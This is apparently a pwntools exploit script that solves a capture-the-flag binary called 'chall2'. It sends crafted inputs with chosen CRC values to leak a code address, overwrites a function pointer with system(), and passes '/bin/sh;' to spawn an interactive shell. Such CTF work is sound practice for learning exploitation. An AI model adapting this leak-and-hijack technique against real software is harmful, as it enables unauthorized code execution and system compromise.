#!/usr/bin/env python3
# coding: utf-8
from pwn import *

elf = ELF("./chall2", checksec=False)

context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h"]

io = process(elf.path)

crc8 = b"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\xFD\x6E\xD3\x68"
crc9 = b"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\xBC\x68\xA2\xB3"

# Exercise program so code address will overlap with uninitialized buffer.
io.sendafter("attempt (1/3):", crc8)
# Overwrite least significant byte and leak buffer's content.
io.sendafter("attempt (2/3):", crc9)

io.send(b"\x01")

elf.address = u64(io.recvuntil("\n", drop=True)[-6:].ljust(8, b"\x00")) - 0x1801
log.success("code starts at %#x" % elf.address)

# Use /bin/sh; as system argument.
payload = fit({
    0: b"\x2F\x62\x69\x6E\x2F\x73\x68\x3B\x41\x41\x41\x41\xDC\x34\xBE\xE3",
    0x3C0: elf.sym["system"]
})

# Leblancian Paradox, call arbitrary function pointer.
io.sendafter("attempt (3/3):", payload)

io.interactive()
